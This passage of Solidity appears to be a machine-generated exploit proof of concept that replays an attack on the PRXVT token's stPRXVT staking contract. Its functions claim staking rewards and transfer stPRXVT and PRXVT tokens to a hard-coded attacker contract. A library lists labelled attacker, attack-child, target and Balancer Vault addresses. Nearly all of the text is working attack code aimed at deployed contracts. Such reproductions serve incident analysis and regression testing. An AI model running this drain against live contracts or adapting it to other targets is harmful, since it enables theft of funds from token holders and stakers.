                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            uint256 transferActionGraphAmount_2 = 178988489719468848000;
            {
                if (Addresses.PRXVT.code.length != 0) {
                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function _prepareAttackChild9() public {}

    function _handleAttackChildCa() internal {
        _readPoolState10();
    }

    function _readPoolState10() internal {
        IstPRXVT(Addresses.stPRXVT).earned(address(this));
        IstPRXVT(Addresses.stPRXVT).claimReward();
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            uint256 transferActionGraphAmount = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            uint256 transferActionGraphAmount_2 = 178988489719468848000;
            {
                if (Addresses.PRXVT.code.length != 0) {
                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function _prepareAttackChild1() public {}

    function _handleAttackChild2() internal {
        _readPoolState11();
    }

    function _readPoolState11() internal {
        IstPRXVT(Addresses.stPRXVT).earned(address(this));
        IstPRXVT(Addresses.stPRXVT).claimReward();
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        {
            uint256 transferActionGraphAmount = 40000000000000000000000;
            IERC20Like(Addresses.stPRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount);
        }
        {
            if (Addresses.PRXVT.code.length != 0) {
                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            uint256 transferActionGraphAmount_2 = 178988489719468848000;
            {
                if (Addresses.PRXVT.code.length != 0) {
                    IERC20Like(Addresses.PRXVT).transfer(Addresses.attack_contract, transferActionGraphAmount_2);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function _prepareAttackChil2() public {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_DEAD = 0x000000000000000000000000000000000000dEaD; // Addresses.A_000000_DEAD = 0x000000000000000000000000000000000000dead label=unresolved roles=recipient source=unresolved confidence=low
    address internal constant attack_child = 0x07Cf59f84c0D8aD79dda77F6fA71E19bE08e3242; // Addresses.attack_child = 0x07cf59f84c0d8ad79dda77f6fa71e19be08e3242 label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant attack_child_21A6 = 0x10318e391bA9Dfb517f7d0f521Bf2691d32821A6; // Addresses.attack_child_21A6 = 0x10318e391ba9dfb517f7d0f521bf2691d32821a6 label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant attack_child_7D8E = 0x19CeEBDD5838C60E73d7557f8950Da0ED0457D8e; // Addresses.attack_child_7D8E = 0x19ceebdd5838c60e73d7557f8950da0ed0457d8e label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant attack_child_F368 = 0x25c9ca5e593553c696EBB09ED675b0f09B5Ef368; // Addresses.attack_child_F368 = 0x25c9ca5e593553c696ebb09ed675b0f09b5ef368 label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant attack_contract = 0x702980b1Ed754C214B79192a4D7c39106f19BcE9; // Addresses.attack_contract = 0x702980b1ed754c214b79192a4d7c39106f19bce9 label=attack_contract roles=asset|attacker_contract|attacker_entry_contract|code_contract|contract|economic_holder|localized_contract|attack_address|profit_holder|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant attack_child_38A8 = 0x72CDfF23dB035D4959901158d230c0c8642a38a8; // Addresses.attack_child_38A8 = 0x72cdff23db035d4959901158d230c0c8642a38a8 label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant attacker_eoa = 0x7407f9bdc4140d5e284ea7De32A9De6037842f45; // Addresses.attacker_eoa = 0x7407f9bdc4140d5e284ea7de32a9de6037842f45 label=attacker_eoa roles=attacker_eoa|contract|attack_address|sender source=tx_metadata.from confidence=high
    address internal constant AgentTokenV2 = 0x7BaB5D2e3EbdE7293888B3f4c022aAAAD88Ae2db; // Addresses.AgentTokenV2 = 0x7bab5d2e3ebde7293888b3f4c022aaaad88ae2db label=AgentTokenV2 roles=asset|contract|attack_address|recipient source=etherscan_v2 confidence=high
    address internal constant attack_child_8466 = 0x8D7bf27794B53129a143b120B1852Fe3048E8466; // Addresses.attack_child_8466 = 0x8d7bf27794b53129a143b120b1852fe3048e8466 label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant attack_child_960D = 0x9A95CEe3B8Ef78b76d3f38dC45F2230Bd4fC960d; // Addresses.attack_child_960D = 0x9a95cee3b8ef78b76d3f38dc45f2230bd4fc960d label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant attack_child_5349 = 0x9ff99efAd40cD6FF67d7552bBEc5434653FA5349; // Addresses.attack_child_5349 = 0x9ff99efad40cd6ff67d7552bbec5434653fa5349 label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant attack_child_B5EB = 0xB649491dcBC08560eCD2a8AE621bCf1d33B9b5eb; // Addresses.attack_child_B5EB = 0xb649491dcbc08560ecd2a8ae621bcf1d33b9b5eb label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; // Addresses.BalancerVault = 0xba12222222228d8ba445958a75a0704d566bf2c8 label=BalancerVault roles=known_protocol source=poc_sketch.known_addresses confidence=high
    address internal constant PRXVT = 0xC2FF2E5aa9023b1bb688178a4a547212f4614bc0; // Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium
    address internal constant attack_child_BD4E = 0xd6E87E48968B44c5Eb79ee3f7697bB8efa19bD4E; // Addresses.attack_child_BD4E = 0xd6e87e48968b44c5eb79ee3f7697bb8efa19bd4e label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant stPRXVT = 0xDAc30a5e2612206E2756836Ed6764EC5817e6Fff; // Addresses.stPRXVT = 0xdac30a5e2612206e2756836ed6764ec5817e6fff label=PRXVTStaking token_symbol=stPRXVT roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant attack_child_F4AD = 0xEA6E0B9f162E5532389f32832529a794bf10F4AD; // Addresses.attack_child_F4AD = 0xea6e0b9f162e5532389f32832529a794bf10f4ad label=attack_child roles=attacker_contract|code_contract|contract|attack_child_contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF; // Addresses.A_FFFFFF_FFFF = 0xffffffffffffffffffffffffffffffffffffffff label=unresolved roles=attack_address source=unresolved confidence=low
}

interface Iattack_child {
    function execute(address, address, address) external;
}

interface Iattack_child_21A6 {
    function execute(address, address, address) external;
}

interface Iattack_child_38A8 {
    function execute(address, address, address) external;
}

interface Iattack_child_5349 {
    function execute(address, address, address) external;
}

interface Iattack_child_7D8E {
    function execute(address, address, address) external;
}

interface Iattack_child_8466 {
    function execute(address, address, address) external;
}

interface Iattack_child_960D {
    function execute(address, address, address) external;
}

interface Iattack_child_B5EB {
    function execute(address, address, address) external;
}

interface Iattack_child_BD4E {
    function execute(address, address, address) external;
}

interface Iattack_child_F368 {
    function execute(address, address, address) external;
}

interface Iattack_child_F4AD {
    function execute(address, address, address) external;
}

interface IstPRXVT {
    function claimReward() external;
    function earned(address) external view returns (uint256);
}

